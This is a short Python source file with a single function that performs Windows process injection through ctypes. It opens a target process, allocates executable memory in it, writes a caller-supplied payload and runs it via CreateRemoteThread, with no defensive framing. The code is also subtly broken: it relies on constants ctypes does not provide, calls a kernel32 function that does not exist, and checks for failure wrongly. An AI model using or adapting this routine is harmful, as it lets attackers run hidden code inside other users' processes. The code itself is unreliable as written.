import ctypes

def MpfPiWriteProcessMemoryCreateRemoteThread(Payload, PayloadSizeInBytes, TargetProcessId):
    hHandle = ctypes.windll.kernel32.OpenProcess(ctypes.PROCESS_ALL_ACCESS, False, TargetProcessId)
    if hHandle is None:
        return None

    BaseAddress = ctypes.windll.kernel32.VirtualAllocEx(hHandle, None, PayloadSizeInBytes, ctypes.MEM_COMMIT, ctypes.PAGE_EXECUTE_READWRITE)
    if BaseAddress is None:
        return None

    if not ctypes.windll.kernel32.SetProcessPrivilegeToken(0):
        return None

    if not ctypes.windll.kernel32.WriteProcessMemory(hHandle, BaseAddress, Payload, PayloadSizeInBytes, None):
        return None

    hThread = ctypes.windll.kernel32.CreateRemoteThread(hHandle, None, 0, BaseAddress, None, 0, None)
    if hThread is None:
        return None

    ctypes.windll.kernel32.WaitForSingleObject(hThread, ctypes.INFINITE)

    return True
